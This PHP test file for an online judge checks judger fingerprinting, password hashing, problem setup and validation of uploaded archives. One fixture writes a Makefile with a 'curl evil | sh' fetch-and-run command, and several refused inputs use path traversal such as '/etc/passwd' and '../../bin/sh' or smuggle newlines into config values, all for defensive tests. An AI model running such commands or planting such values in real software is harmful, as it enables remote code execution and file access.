<?php

require_once __DIR__ . '/../app/libs/uoj-validate-lib.php';
require_once __DIR__ . '/../app/libs/uoj-judger-lib.php';
require_once __DIR__ . '/../app/libs/uoj-data-lib.php';

// builds an upload folder of a problem with a custom judger and returns its fingerprint
function fingerprint_of($files, $conf) {
	$dir = sys_get_temp_dir() . '/uoj_fingerprint_test_' . getmypid();
	exec('rm -rf ' . escapeshellarg($dir));
	mkdir("$dir/require", 0755, true);
	foreach ($files as $name => $content) {
		file_put_contents("$dir/$name", $content);
	}
	$fingerprint = dataCustomJudgerFingerprint($dir, $conf);
	exec('rm -rf ' . escapeshellarg($dir));
	return $fingerprint;
}

$files = [
	'problem.conf' => "use_builtin_judger off\n",
	'Makefile' => "all: judger std val\n",
	'judger.cpp' => "int main() {}\n",
	'std.cpp' => "int main() {}\n",
	'require/lib.h' => "// lib\n",
	'input1.txt' => "1 2\n",
	'output1.txt' => "3\n",
	'ex_input1.txt' => "2 3\n",
	'ex_output1.txt' => "5\n",
];
$conf = ['use_builtin_judger' => 'off', 'n_tests' => '1', 'n_ex_tests' => '1', 'time_limit' => '1'];
$approved = fingerprint_of($files, $conf);

check_same(64, strlen($approved), 'the fingerprint is a SHA256');
check_same($approved, fingerprint_of($files, $conf), 'the fingerprint is stable');
check_same($approved, fingerprint_of($files, array_reverse($conf, true)), 'the order of problem.conf does not matter');

// what a successful hack does: one more extra test
$hacked = $files + ['ex_input2.txt' => "\x00\xff\r\n", 'ex_output2.txt' => "9\n"];
$hacked_conf = ['n_ex_tests' => 2] + $conf;
check_same($approved, fingerprint_of($hacked, $hacked_conf), 'a new extra test keeps the fingerprint');
check_same($approved, fingerprint_of(['ex_input1.txt' => "7 7\n"] + $files, $conf), 'the content of an extra test does not matter');

// everything else has to be approved again
$changed = function($files, $conf) use ($approved) {
	return fingerprint_of($files, $conf) !== $approved;
};
check_same(true, $changed(['Makefile' => "all:\n\tcurl evil | sh\n"] + $files, $conf), 'a changed Makefile');
check_same(true, $changed(['judger.cpp' => "int main() { return 1; }\n"] + $files, $conf), 'a changed judger');
check_same(true, $changed(['require/lib.h' => "// evil\n"] + $files, $conf), 'a changed file in a subfolder');
check_same(true, $changed(['input1.txt' => "5 5\n"] + $files, $conf), 'a changed main test');
check_same(true, $changed($files + ['helper.sh' => "#!/bin/sh\n"], $conf), 'a new file');
check_same(true, $changed($files + ['ex_input2.txt' => "1\n"], $conf), 'a file named like an extra test that is not one');
check_same(true, $changed($files, ['time_limit' => '100'] + $conf), 'a changed limit');
check_same(true, $changed($files, $conf + ['input_suf' => 'cpp']), 'a changed file name pattern');
check_same(true, $changed(array_diff_key($files, ['std.cpp' => 0]), $conf), 'a removed file');

// ---- the password of a judger is kept as a hash
$judger_password = 'Wd3kq0aFz7Jv9XuP2mYt8RcL5nHs1GbE';
$stored = judgerPasswordToStore($judger_password);
check_same('sha256:' . hash('sha256', $judger_password), $stored, 'the hash of a judger password');
check_same(true, strlen($stored) <= 100, 'the hash fits the column');
check_same(true, judgerPasswordMatches($stored, $judger_password), 'the password of a judger');
check_same(false, judgerPasswordMatches($stored, $judger_password . 'x'), 'a wrong password');
check_same(false, judgerPasswordMatches($stored, $stored), 'the hash is not the password');
check_same(false, judgerPasswordMatches($stored, substr($stored, 7)), 'neither is the hash without its prefix');
// a row that was written by hand is accepted once, and hashed then
check_same(true, judgerPasswordMatches($judger_password, $judger_password), 'a password that is not hashed yet');
check_same(false, judgerPasswordMatches($judger_password, 'something else'), 'a wrong password for one that is not hashed yet');
check_same(false, judgerPasswordMatches('', ''), 'a judger without a password');
check_same(false, judgerPasswordIsHashed($judger_password), 'a password is not a hash');
check_same(true, judgerPasswordIsHashed($stored), 'a hash is a hash');

// ---- setting up a problem: the form, the files, problem.conf
require_once __DIR__ . '/../app/libs/uoj-utility-lib.php';
require_once __DIR__ . '/../app/libs/uoj-problem-lib.php';

// The names of files are taken apart byte by byte. The functions of PHP for it go by the
// locale before PHP 8, and in the locale of a server they eat the Chinese a name begins with.
$locale_before = setlocale(LC_ALL, 0);
setlocale(LC_ALL, 'C');
check_same(array('本地测试 工具.py', '题面.pdf', 'c.txt', 'plain', ''), array(uojFileBaseName('本地测试 工具.py'), uojFileBaseName('C:\\fake\\题面.pdf'), uojFileBaseName('a/b/c.txt'), uojFileBaseName('plain'), uojFileBaseName('a/')), 'the name of a file without its folders');
check_same(array(array('题面1', 'in'), array('a.tar', 'gz'), array('Makefile', ''), array('', 'in')), array(uojFileNameParts('题面1.in'), uojFileNameParts('a.tar.gz'), uojFileNameParts('Makefile'), uojFileNameParts('.in')), 'a name around its last dot');
check_same(array(array('in', '数据1'), array('out', '数据1'), array('in', '样例_1.txt')), array(problemTestFileRole('数据1.in'), problemTestFileRole('数据1.ans'), problemTestFileRole('样例_input1.txt')), 'test files with Chinese names');
$found = problemDetectTests(array('甲1.in', '甲1.out', '乙1.in', '乙1.out'));
check_same(2, count($found['tests']), 'two tests whose names differ in their Chinese only are two tests');
setlocale(LC_ALL, $locale_before);

// what the form says
$form = array('type' => 'traditional', 'time_limit' => '1.5', 'memory_limit' => '512', 'checker' => 'wcmp', 'scoring' => 'per_test', 'subtasks' => '', 'n_samples' => '');
list($settings, $err) = problemSettingsFromForm($form);
check_same(array('', 'traditional', '1.5', 512, 'wcmp', 'per_test', array(), null),
	array($err, $settings['type'], $settings['time_limit'], $settings['memory_limit'], $settings['checker'], $settings['scoring'], $settings['subtasks'], $settings['n_samples']), 'the form of an ordinary problem');
list($with_subtasks, $err) = problemSettingsFromForm(array('scoring' => 'subtasks', 'subtasks' => "3 30\r\n 7, 30 \n\n10：40\n") + $form);
check_same(array('', array(array(3, 30), array(7, 30), array(10, 40))), array($err, $with_subtasks['subtasks']), 'subtasks: the last test and the score of each, a line each');
check_same("3 30\n7 30\n10 40", problemSubtasksText($with_subtasks['subtasks']), 'and back as the text of the form');
check_same(2, problemSettingsFromForm(array('n_samples' => '2') + $form)[0]['n_samples'], 'how many of the extra tests are samples');
check_same('hcmp', problemSettingsFromForm(array('checker' => 'hcmp') + $form)[0]['checker'], 'a builtin checker that the form does not list is kept');
foreach (array(
	array('type' => 'quiz'), array('type' => ''), array('time_limit' => '0'), array('time_limit' => '1s'), array('time_limit' => '601'), array('time_limit' => "1\ntime_limit 9"),
	array('time_limit' => array('1')), array('memory_limit' => '0'), array('memory_limit' => '256MB'), array('memory_limit' => "256\nmulti_pass 9"), array('memory_limit' => '99999'),
	array('checker' => '../../bin/sh'), array('checker' => 'wcmp extra'), array('checker' => ''), array('scoring' => 'curve'), array('n_samples' => '-1'), array('n_samples' => 'all'),
	array('scoring' => 'subtasks', 'subtasks' => ''), array('scoring' => 'subtasks', 'subtasks' => '10 100'), array('scoring' => 'subtasks', 'subtasks' => "5 50\n3 50"),
	array('scoring' => 'subtasks', 'subtasks' => "5 50\n10 40"), array('scoring' => 'subtasks', 'subtasks' => "5 fifty\n10 50"), array('scoring' => 'subtasks', 'subtasks' => "5 50 on\n10 50")
) as $wrong) {
	check_same(true, problemSettingsFromForm($wrong + $form)[1] !== '', 'refused in the form of a problem: ' . json_encode($wrong));
}

// which files are the tests
check_same(array(array('in', '1'), array('out', '1'), array('out', 'a b'), array('in', '3.txt'), array('out', '3.txt'), array('in', 'ex_2.txt'), array('out', 'ex_2.dat'), array('in', '.txt')),
	array(problemTestFileRole('1.in'), problemTestFileRole('1.out'), problemTestFileRole('a b.ANS'), problemTestFileRole('input3.txt'), problemTestFileRole('output3.txt'),
		problemTestFileRole('ex_in2.txt'), problemTestFileRole('ex_answer2.dat'), problemTestFileRole('in.txt')), 'the two files of a test, by ending or by a word in the name');
foreach (array('problem.conf', 'chk.cpp', 'main.txt', 'index.txt', 'info.txt', 'readme.txt', 'std.cpp', 'testlib.h', 'printout.txt', 'Makefile', '.in', 'statement.md') as $other) {
	check_same(null, problemTestFileRole($other), "no test data: $other");
}
check_same(array('data', 'in'), problemNamesPattern(array('data2.in', 'data1.in', 'data3.in')), 'names the judgers read as they are');
check_same(array('a1b', 'txt'), problemNamesPattern(array('a1b1.txt', 'a1b2.txt')), 'a number in the name that is not the number of the test');
check_same(array('input', 'txt'), problemNamesPattern(array('ex_input1.txt'), 'ex_'), 'the same for extra tests');
foreach (array(array('1.in', '2.in'), array('data01.in', 'data02.in'), array('data0.in', 'data1.in'), array('data1.in', 'data3.in'), array('a1.in', 'b2.in'), array('data1.in', 'data2.txt'), array('数据1.in'), array()) as $names) {
	check_same(null, problemNamesPattern($names), 'names the judgers do not read as they are: ' . json_encode($names, JSON_UNESCAPED_UNICODE));
}

// files that are called what the judgers call them stay as they are
$found = problemDetectTests(array('problem.conf', 'input2.txt', 'output1.txt', 'input1.txt', 'output2.txt', 'ex_input1.txt', 'ex_output1.txt', 'chk.cpp'));
check_same(array(array(array('input1.txt', 'output1.txt'), array('input2.txt', 'output2.txt')), array(array('ex_input1.txt', 'ex_output1.txt')), array('input', 'txt', 'output', 'txt'), array(), array(), array()),
	array($found['tests'], $found['extra'], $found['pattern'], $found['renames'], $found['create'], $found['unpaired']), 'the data of a problem as UOJ wants it');
$found = problemDetectTests(array('data10.in', 'data10.out', 'data2.in', 'data2.out', 'data1.in', 'data1.out', 'data3.in', 'data3.out', 'data4.in', 'data4.out', 'data5.in', 'data5.out',
	'data6.in', 'data6.out', 'data7.in', 'data7.out', 'data8.in', 'data8.out', 'data9.in', 'data9.out'));
check_same(array(10, array('data10.in', 'data10.out'), array()), array(count($found['tests']), $found['tests'][9], $found['renames']), 'ten tests in the order of their numbers');
// any other names are paired, put in their natural order, and called what the judgers call them
$found = problemDetectTests(array('10.in', '10.ans', '2.in', '2.ans', '1.in', '1.ans', 'sample2.in', 'sample2.out', 'sample1.in', 'sample1.out', 'std.cpp', 'notes.txt'));
check_same(array(array('data', 'in', 'data', 'out'), array(array('data1.in', 'data1.out'), array('data2.in', 'data2.out'), array('data3.in', 'data3.out')), array(array('ex_data1.in', 'ex_data1.out'), array('ex_data2.in', 'ex_data2.out'))),
	array($found['pattern'], $found['tests'], $found['extra']), 'tests named by number alone, and samples named samples');
check_same(array('1.in' => 'data1.in', '1.ans' => 'data1.out', '2.in' => 'data2.in', '2.ans' => 'data2.out', '10.in' => 'data3.in', '10.ans' => 'data3.out',
	'sample1.in' => 'ex_data1.in', 'sample1.out' => 'ex_data1.out', 'sample2.in' => 'ex_data2.in', 'sample2.out' => 'ex_data2.out'), $found['renames'], 'what is called what afterwards');
$found = problemDetectTests(array('small.in', 'small.out', 'big.in', 'orphan.out', 'data1.in'));
check_same(array(array(array('data1.in', 'data1.out')), array('small.in' => 'data1.in', 'small.out' => 'data1.out'), array('big.in', 'data1.in', 'orphan.out')),
	array($found['tests'], $found['renames'], $found['unpaired']), 'half a test is no test, and is said to be there');
// a problem whose answer is not a file has tests of an input alone
$found = problemDetectTests(array('a.in', 'b.in', 'b.out', 'ex_c.in'), true);
check_same(array(array(array('data1.in', 'data1.out'), array('data2.in', 'data2.out')), array(array('ex_data1.in', 'ex_data1.out')), array('data1.out', 'ex_data1.out'), array()),
	array($found['tests'], $found['extra'], $found['create'], $found['unpaired']), 'the answer files that are missing are made');
$found = problemDetectTests(array('input1.txt', 'input2.txt'), true);
check_same(array(array('data', 'in', 'data', 'out'), array('input1.txt' => 'data1.in', 'input2.txt' => 'data2.in'), array('data1.out', 'data2.out')), array($found['pattern'], $found['renames'], $found['create']), 'also where the inputs had good names');
check_same(array(array(), array()), array(problemDetectTests(array('problem.conf', 'std.cpp'))['tests'], problemDetectTests(array())['tests']), 'no tests');

// problem.conf from the two
$ten = problemDetectTests(array('1.in', '1.out', '2.in', '2.out', 'sample1.in', 'sample1.out', 'sample2.in', 'sample2.out'));
check_same(array(array('use_builtin_judger' => 'on', 'use_builtin_checker' => 'wcmp', 'n_tests' => 2, 'n_ex_tests' => 2, 'n_sample_tests' => 2, 'input_pre' => 'data', 'input_suf' => 'in',
	'output_pre' => 'data', 'output_suf' => 'out', 'time_limit' => '1.5', 'memory_limit' => 512), ''), problemConfFromSettings($settings, $ten), 'an ordinary problem');
$conf_of = function($changes, $old = array()) use ($settings, $ten) {
	return problemConfFromSettings($changes + $settings, $ten, $old)[0];
};
check_same(false, isset($conf_of(array('checker' => 'custom'))['use_builtin_checker']), 'a checker of its own');
check_same(1, $conf_of(array('n_samples' => 1))['n_sample_tests'], 'one of the extra tests is a sample');
check_same(2, $conf_of(array('n_samples' => 9))['n_sample_tests'], 'no more samples than extra tests');
check_same(array('on', false), array($conf_of(array('type' => 'interactive'))['interaction_mode'], isset($conf_of(array('type' => 'interactive'))['use_builtin_checker'])), 'an interactive problem is checked by its interactor');
$passes = $conf_of(array('type' => 'multi_pass', 'passes' => 3));
check_same(array(3, false), array($passes['multi_pass'], isset($passes['use_builtin_checker'])), 'a multi-pass problem says how many passes, and is judged by a checker of its own');
check_same(false, isset($conf_of(array('type' => 'traditional', 'passes' => 3))['multi_pass']), 'a problem of another kind has no passes');
check_same(false, isset($conf_of(array(), array('multi_pass' => '2', 'n_tests' => '2'))['multi_pass']), 'and loses them when it becomes one');
check_same(array(2, 5), array(problemSettingsFromForm(array('type' => 'multi_pass') + $form)[0]['passes'], problemSettingsFromForm(array('type' => 'multi_pass', 'passes' => '5') + $form)[0]['passes']), 'two passes unless the form says more');
foreach (array('1', '0', '21', 'many', '2.5') as $bad) {
	check_same(true, problemSettingsFromForm(array('type' => 'multi_pass', 'passes' => $bad) + $form)[1] !== '', "refused as a number of passes: $bad");
}
check_same('on', $conf_of(array('type' => 'grader'))['with_implementer'], 'a problem with a grader');
$answers = $conf_of(array('type' => 'submit_answer'));
check_same(array('on', 0, 0, false, false), array($answers['submit_answer'], $answers['n_ex_tests'], $answers['n_sample_tests'], isset($answers['time_limit']), isset($answers['memory_limit'])), 'a problem that asks for answers has no limits and no extra tests');
check_same(1, $conf_of(array('scoring' => 'all'))['n_subtasks'], 'all or nothing is one subtask');
$parts = $conf_of(array('scoring' => 'subtasks', 'subtasks' => array(array(1, 40), array(2, 60))));
check_same(array(2, 1, 40, 2, 60), array($parts['n_subtasks'], $parts['subtask_end_1'], $parts['subtask_score_1'], $parts['subtask_end_2'], $parts['subtask_score_2']), 'subtasks');
check_same(true, strpos(problemConfFromSettings(array('scoring' => 'subtasks', 'subtasks' => array(array(1, 40), array(5, 60))) + $settings, $ten)[1], '2 个测试点') !== false, 'subtasks that do not end where the tests end');
// what the form does not decide is kept, what it decides is replaced
$old = array('use_builtin_judger' => 'on', 'n_tests' => '7', 'time_limit' => '9', 'interaction_mode' => 'on', 'n_subtasks' => '3', 'subtask_end_1' => '2', 'subtask_score_1' => '10',
	'output_limit' => '128', 'time_limit_2' => '5', 'point_score_1' => '70', 'token' => 'abc');
$kept = $conf_of(array(), $old);
check_same(array('128', '5', '70', 'abc', 2, '1.5', false, false, false), array($kept['output_limit'], $kept['time_limit_2'], $kept['point_score_1'], $kept['token'], $kept['n_tests'], $kept['time_limit'],
	isset($kept['interaction_mode']), isset($kept['n_subtasks']), isset($kept['subtask_end_1'])), 'keys the form knows nothing of stay');
check_same(false, isset($conf_of(array('scoring' => 'all'), $old)['point_score_1']), 'the score of a single test means nothing where tests are not scored one by one');
// and back: the form shows what a problem.conf says
$shown = problemSettingsOfConf($parts + array('n_tests' => 2));
check_same(array('traditional', '1.5', 512, 'wcmp', 'subtasks', array(array(1, 40), array(2, 60)), 2), array($shown['type'], $shown['time_limit'], $shown['memory_limit'], $shown['checker'], $shown['scoring'], $shown['subtasks'], $shown['n_samples']), 'the settings of a problem.conf');
check_same(array('multi_pass', 'custom', 'all', 4), array_values(array_intersect_key(problemSettingsOfConf(array('multi_pass' => '4', 'n_subtasks' => '1', 'n_tests' => '3')), array('type' => 0, 'checker' => 0, 'scoring' => 0, 'passes' => 0))), 'of a multi-pass problem');
check_same('traditional', problemSettingsOfConf(array('multi_pass' => '1'))['type'], 'one pass is no multi-pass problem');
check_same(array('interactive', 'submit_answer', 'grader', 'traditional'), array(problemSettingsOfConf(array('interaction_mode' => 'on'))['type'], problemSettingsOfConf(array('submit_answer' => 'on'))['type'],
	problemSettingsOfConf(array('with_implementer' => 'on'))['type'], problemSettingsOfConf(-1)['type']), 'the kinds of problems');

// the files are called what was decided, also where one takes the name of another
$dir = sys_get_temp_dir() . '/uoj_arrange_test_' . getmypid();
exec('rm -rf ' . escapeshellarg($dir));
mkdir($dir);
foreach (array('data1.in' => 'second', 'data1.out' => 'second answer', 'a.in' => 'first', 'a.out' => 'first answer', 'only.in' => 'third', 'notes.txt' => 'notes') as $name => $content) {
	file_put_contents("$dir/$name", $content);
}
$found = problemDetectTests(problemUploadedNames($dir), true);
check_same('', problemArrangeFiles($dir, $found), 'arranging the files');
$names = problemUploadedNames($dir);
sort($names);
check_same(array('data1.in', 'data1.out', 'data2.in', 'data2.out', 'data3.in', 'data3.out', 'notes.txt'), $names, 'the files afterwards');
check_same(array('first', 'first answer', 'second', 'second answer', 'third', ''), array(file_get_contents("$dir/data1.in"), file_get_contents("$dir/data1.out"), file_get_contents("$dir/data2.in"),
	file_get_contents("$dir/data2.out"), file_get_contents("$dir/data3.in"), file_get_contents("$dir/data3.out")), 'and what is in them');
check_same(array(array(), array()), array(problemDetectTests($names, true)['renames'], problemDetectTests($names, true)['create']), 'arranging them again changes nothing');
exec('rm -rf ' . escapeshellarg($dir));

// what the form that makes a problem says about the problem itself
list($basics, $err) = problemBasicsFromForm(array('title' => ' A + B Problem ', 'statement_md' => "# 题目描述\n", 'tags' => '入门， 模拟,入门', 'public' => 'on'));
check_same(array('', 'A + B Problem', array('入门', '模拟'), 0), array($err, $basics['title'], $basics['tags'], $basics['is_hidden']), 'a title, tags and whether everybody sees it');
check_same(1, problemBasicsFromForm(array('title' => 'x'))[0]['is_hidden'], 'a problem is hidden unless it is said to be public');
foreach (array(array('title' => ' '), array('title' => str_repeat('长', 34)), array('title' => array('x')), array('title' => 'x', 'tags' => str_repeat('t', 31)), array('title' => 'x', 'tags' => 'a,b,c,d,e,f,g,h,i,j,k'),
	array('title' => 'x', 'statement_md' => str_repeat('x', 1000001))) as $wrong) {
	check_same(true, problemBasicsFromForm($wrong)[1] !== '', 'refused in the form that makes a problem: ' . substr(json_encode($wrong, JSON_UNESCAPED_UNICODE), 0, 60));
}

// the files of a version of the data of a problem
$dir = sys_get_temp_dir() . '/uoj_manifest_test_' . getmypid();
exec('rm -rf ' . escapeshellarg($dir));
mkdir("$dir/require", 0755, true);
file_put_contents("$dir/problem.conf", "n_tests 1\n");
file_put_contents("$dir/input1.txt", "1 2\n");
file_put_contents("$dir/require/lib.h", "");
check_same([
	'input1.txt' => [4, hash('sha256', "1 2\n")],
	'problem.conf' => [10, hash('sha256', "n_tests 1\n")],
	'require/lib.h' => [0, hash('sha256', '')],
], dataManifest($dir), 'the manifest of a folder');
exec('rm -rf ' . escapeshellarg($dir));

check_same('/var/uoj_data/prepare_7', dataStageDir(7), 'the staging folder of a problem');
check_same('/var/uoj_data/archive/7/3.zip', dataArchivePath(7, 3), 'the archive of an old version');

// ---- what an uploaded archive may hold, and where its files go
require_once __DIR__ . '/../app/libs/uoj-upload-lib.php';

foreach (array('input1.txt', 'data/input1.txt', 'require/lib.h', '数据/输入 1.txt', 'a/b/c/d/e/f.txt') as $name) {
	check_same('', uploadNameError($name), "$name may be unpacked");
}
$bad_names = array('', '/etc/passwd', '../input1.txt', 'data/../../x', 'a//b', './x', 'C:/x', 'a\\b', "a\nb", "a\x00b", 'a/b/c/d/e/f/g.txt', str_repeat('x', 201), array('x'));
foreach ($bad_names as $name) {
	check_same(true, uploadNameError($name) !== '', 'refused as the name of a file: ' . json_encode($name));
}
foreach (array('__MACOSX/data/._input1.txt', 'data/.DS_Store', 'Thumbs.db', '._problem.conf') as $name) {
	check_same(true, uploadIsJunk($name), "$name is left out");
}
check_same(false, uploadIsJunk('data/input1.txt'), 'a file of the data is not');

check_same(array('problem.conf' => 'problem.conf', 'input1.txt' => 'input1.txt'), uploadTargets(array('problem.conf', 'input1.txt')), 'files at the top stay where they are');
check_same(array('data/problem.conf' => 'problem.conf', 'data/input1.txt' => 'input1.txt', 'data/require/lib.h' => 'require/lib.h'),
	uploadTargets(array('data/', 'data/problem.conf', 'data/input1.txt', 'data/require/', 'data/require/lib.h', '__MACOSX/data/._input1.txt', 'data/.DS_Store')),
	'an archive of a folder is unpacked without the folder, and without the junk');
check_same(array('a/x.txt' => 'a/x.txt', 'b/y.txt' => 'b/y.txt'), uploadTargets(array('a/x.txt', 'b/y.txt')), 'two folders are not one');
check_same(array('problem.conf' => 'problem.conf', 'require/lib.h' => 'require/lib.h'), uploadTargets(array('problem.conf', 'require/lib.h')), 'a file at the top keeps the folders');
check_same(array('require/lib.h' => 'require/lib.h'), uploadTargets(array('require/lib.h')), 'require is a folder of the data itself');
check_same(array('my problem/data 1/in.txt' => 'data 1/in.txt'), uploadTargets(array('my problem/data 1/in.txt')), 'names with spaces are names like any other');
check_same(array(), uploadTargets(array('data/', '__MACOSX/x')), 'an archive without files');

$limits = array('files' => 3, 'bytes' => 1000, 'file_bytes' => 600, 'ratio' => 0);
$entry = function($name, $size = 10, $compressed = 5, $is_link = false) {
	return array('name' => $name, 'size' => $size, 'compressed' => $compressed, 'is_link' => $is_link);
};
check_same('', uploadEntriesError(array($entry('problem.conf'), $entry('input1.txt'), $entry('output1.txt')), $limits), 'an archive within the limits');
check_same('', uploadEntriesError(array($entry('a'), $entry('b'), $entry('c'), $entry('__MACOSX/._a'), $entry('.DS_Store')), $limits), 'junk does not count');
$refused = array(
	'too many files' => array($entry('a'), $entry('b'), $entry('c'), $entry('d')),
	'a file that is too big' => array($entry('a', 601)),
	'too much altogether' => array($entry('a', 400), $entry('b', 400), $entry('c', 400)),
	'a name that climbs out' => array($entry('../a')),
	'a symbolic link' => array($entry('a', 10, 5, true)),
	'nothing but folders and junk' => array($entry('data/', 0, 0), $entry('.DS_Store')),
	'two files that become one' => array($entry('Input1.txt'), $entry('input1.txt')),
);
foreach ($refused as $what => $entries) {
	check_same(true, uploadEntriesError($entries, $limits) !== '', "refused: $what");
}
check_same(true, uploadEntriesError(array($entry('a', 500)), $limits, 600) !== '', 'refused: too much with what the problem holds already');
check_same('', uploadEntriesError(array($entry('a', 500)), $limits, 500), 'just enough room');
check_same('', uploadEntriesError(array($entry('a', 500, 1)), $limits), 'how well an archive packs is not looked at unless asked');
check_same(true, uploadEntriesError(array($entry('a', 500, 1)), array('ratio' => 100) + $limits) !== '', 'refused: an archive that packs better than allowed');

// ---- what is wrong with the data of a problem before it is synced
$conf = array('use_builtin_judger' => 'on', 'use_builtin_checker' => 'ncmp', 'n_tests' => '2', 'n_ex_tests' => '1', 'n_sample_tests' => '1',
	'input_pre' => 'in', 'input_suf' => 'txt', 'output_pre' => 'out', 'output_suf' => 'txt', 'time_limit' => '1', 'memory_limit' => '256');
$files = array('problem.conf', 'in1.txt', 'out1.txt', 'in2.txt', 'out2.txt', 'ex_in1.txt', 'ex_out1.txt');
$report = uploadPreflight($files, $conf, false);
check_same(array(array(), array()), array($report['errors'], $report['warnings']), 'data that is all there');
check_same(true, in_array('2 个测试点', $report['facts'], true), 'and the report says what there is');
$errors_of = function($files, $conf, $hackable = false) {
	return join(' | ', uploadPreflight($files, $conf, $hackable)['errors']);
};
check_same(true, strpos($errors_of(array(), -1), '还没有上传') !== false, 'nothing was uploaded');
check_same(true, strpos($errors_of(array('in1.txt'), -1), 'problem.conf') !== false, 'no problem.conf');
check_same(true, strpos($errors_of($files, -2), '语法错误') !== false, 'a problem.conf that can not be read');
check_same(true, strpos($errors_of(array_diff($files, array('out2.txt', 'ex_in1.txt')), $conf), 'out2.txt、ex_in1.txt') !== false, 'files that are missing are named');
check_same(true, strpos($errors_of($files, array('n_tests' => '0') + $conf), '还没有测试数据') !== false, 'a problem the form wrote before it had data');
check_same(true, strpos($errors_of($files, array('n_tests' => 'many') + $conf), 'n_tests') !== false, 'a number of tests that is none');
check_same(true, strpos($errors_of($files, array('n_sample_tests' => '2') + $conf), 'n_sample_tests') !== false, 'more samples than extra tests');
$without = $conf;
unset($without['n_sample_tests']);
check_same(true, strpos($errors_of($files, $without), 'n_sample_tests') !== false, 'the number of samples that is not written is the number of tests');
unset($without['use_builtin_checker']);
check_same(true, strpos($errors_of($files, array('n_sample_tests' => '1') + $without), 'chk.cpp') !== false, 'no checker');
check_same('', $errors_of(array_merge($files, array('chk.cpp', 'testlib.h')), array('n_sample_tests' => '1') + $without), 'a checker of its own');
check_same(true, strpos($errors_of($files, $conf, true), 'std.cpp') !== false && strpos($errors_of($files, $conf, true), 'val.cpp') !== false, 'a problem that can be hacked needs a solution and a validator');
check_same('', $errors_of(array_merge($files, array('std.cpp', 'val.cpp')), $conf, true), 'and has them');
$warnings = uploadPreflight(array_merge($files, array('in3.txt', 'out3.txt')), array('time_limit' => '600') + $conf, false)['warnings'];
check_same(2, count($warnings), 'files nothing uses and a limit out of the ordinary are worth a look');
check_same(true, strpos(join(' ', $warnings), 'in3.txt') !== false, 'the files nothing uses are named');
// a multi-pass problem needs a checker of its own, and is neither interactive nor open to hacks
$passes_conf = array('multi_pass' => '2') + $conf;
unset($passes_conf['use_builtin_checker']);
$passes_files = array_merge($files, array('chk.cpp'));
check_same('', $errors_of($passes_files, $passes_conf), 'a multi-pass problem with its checker');
check_same(true, strpos($errors_of($files, $passes_conf), 'chk.cpp') !== false, 'and without it');
check_same(true, in_array('通信题：程序最多运行 2 轮，每一轮之后由校验器决定是否再运行一轮', uploadPreflight($passes_files, $passes_conf, false)['facts'], true), 'the report says how many passes');
check_same(true, strpos($errors_of($files, array('multi_pass' => '2') + $conf), '自己的校验器') !== false, 'a builtin checker never asks for another pass');
check_same(true, strpos($errors_of(array_merge($passes_files, array('std.cpp', 'val.cpp')), $passes_conf, true), 'Hack') !== false, 'a multi-pass problem can not be hacked');
check_same(true, strpos($errors_of(array_merge($passes_files, array('interactor.cpp')), array('interaction_mode' => 'on') + $passes_conf), '交互题') !== false, 'nor be interactive');
check_same(true, strpos($errors_of($passes_files, array('submit_answer' => 'on') + $passes_conf), '提交答案') !== false, 'nor ask for answers only');
check_same(true, strpos($errors_of($passes_files, array('multi_pass' => '99') + $passes_conf), 'multi_pass') !== false, 'nor have no end of passes');
check_same('', $errors_of($files, array('multi_pass' => '1') + $conf), 'one pass is what every problem has');
$custom = uploadPreflight(array('problem.conf', 'judger.cpp', 'Makefile'), array('use_builtin_judger' => 'off'), false);
check_same(array(0, 1), array(count($custom['errors']), count($custom['warnings'])), 'a judger of its own is said to need the system administrator');

